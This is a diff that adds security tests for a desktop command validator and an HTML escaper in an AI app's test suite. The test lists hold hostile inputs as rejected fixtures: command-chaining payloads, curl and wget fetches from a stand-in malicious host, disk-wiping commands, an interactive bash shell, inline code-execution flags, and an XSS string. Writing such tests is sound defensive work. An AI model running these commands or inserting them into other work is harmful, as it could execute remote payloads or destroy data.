@@ -27,6 +27,7 @@ import { performWebSearch, formatSearchAugmentation } from '../src/server/servic
 import { detectWebDomain, generateDynamicWebHtml } from '../src/server/cowork/language-generators';
 import { apiRouter } from '../src/server/routes/api';
 import { generateTokens, verifyAccessToken, extractToken, authenticateRequest, authMiddleware, getJwtSecret } from '../src/server/auth/auth';
+import { validateDesktopCommand, executeSafeDesktopCommand, escapeHtml } from '../src/server/security/desktop-security';
 
 describe('Cortex AI Automated Test Suite', () => {
   let testUser1: User;
@@ -2671,6 +2672,107 @@ print(fibonacci(10))
       } finally {
         server.close();
       }
+    });
+  });
+
+
+  describe('26. Electron Desktop IPC Security & RCE Mitigation', () => {
+    it('rejects shell chaining operators and command injection vectors', () => {
+      const chainingPayloads = [
+        'git status && calc.exe',
+        'node -v; whoami',
+        'python | dir',
+        'git log \x60whoami\x60',
+        'node $(id)',
+        'git status > out.txt',
+        'npm < in.txt',
+        'git status\ncalc.exe',
+        'git status\0whoami',
+      ];
+
+      for (const payload of chainingPayloads) {
+        const result = validateDesktopCommand(payload);
+        assert.strictEqual(
+          result.allowed,
+          false,
+          `Payload "${payload}" must be rejected by security policy`
+        );
+        assert.ok(
+          result.reason?.includes('Command chaining') || result.reason?.includes('blocked'),
+          `Rejection reason must mention security policy for "${payload}"`
+        );
+      }
+    });
+
+    it('rejects unapproved binaries outside the strict desktop allowlist', () => {
+      const unauthorizedBinaries = [
+        'powershell.exe -Command Get-Process',
+        'cmd.exe /c dir',
+        'curl http://malicious.local/payload.sh',
+        'wget http://malicious.local/malware',
+        'rmdir /s /q C:\\',
+        'format D:',
+        'calc.exe',
+        'bash -i',
+        'sh script.sh',
+      ];
+
+      for (const cmd of unauthorizedBinaries) {
+        const result = validateDesktopCommand(cmd);
+        assert.strictEqual(result.allowed, false, `Binary in "${cmd}" must be rejected`);
+        assert.ok(result.reason?.includes('not permitted') || result.reason?.includes('approved'));
+      }
+    });
+
+    it('rejects arbitrary code execution flags on allowlisted runtimes', () => {
+      const dangerousFlags = [
+        'node -e "require(\'child_process\').execSync(\'calc\')"',
+        'node --eval "console.log(process.env)"',
+        'python -c "import os; os.system(\'calc\')"',
+        'python3 -c "print(1)"',
+        'git --upload-pack=exploit',
+        'git --receive-pack=exploit',
+      ];
+
+      for (const cmd of dangerousFlags) {
+        const result = validateDesktopCommand(cmd);
+        assert.strictEqual(result.allowed, false, `Flag in "${cmd}" must be blocked`);
+        assert.ok(result.reason?.includes('blocked by security policy'));
+      }
+    });
+
+    it('rejects empty, null, and non-string inputs safely without crashing', () => {
+      assert.strictEqual(validateDesktopCommand('').allowed, false);
+      assert.strictEqual(validateDesktopCommand('   ').allowed, false);
+      assert.strictEqual(validateDesktopCommand(null as any).allowed, false);
+      assert.strictEqual(validateDesktopCommand(undefined as any).allowed, false);
+      assert.strictEqual(validateDesktopCommand(12345 as any).allowed, false);
+      assert.strictEqual(validateDesktopCommand({} as any).allowed, false);
+    });
+
+    it('allows and safely executes authorized development tools via direct execFile', async () => {
+      const validCommand = 'node -v';
+      const validation = validateDesktopCommand(validCommand);
+      assert.strictEqual(validation.allowed, true);
+      assert.strictEqual(validation.binary, 'node');
+      assert.deepStrictEqual(validation.args, ['-v']);
+
+      const execResult = await executeSafeDesktopCommand(validCommand);
+      assert.strictEqual(execResult.exitCode, 0);
+      assert.ok(execResult.stdout.startsWith('v'), 'node -v must output semantic version');
+      assert.strictEqual(execResult.stderr, '');
+    });
+
+    it('sanitizes untrusted error messages against HTML injection in desktop fallback screen', () => {
+      const maliciousHtml = '<script>alert(1)</script><img src="x" onerror="steal()"/>&"\'';
+      const escaped = escapeHtml(maliciousHtml);
+
+      assert.ok(!escaped.includes('<script>'), 'Must not contain raw script tag');
+      assert.ok(!escaped.includes('<img'), 'Must escape angle brackets preventing tag injection');
+      assert.ok(escaped.includes('&lt;script&gt;'));
+      assert.ok(escaped.includes('&amp;'));
+      assert.ok(escaped.includes('&quot;'));
+      assert.ok(escaped.includes('&#39;'));
     });
   });
 
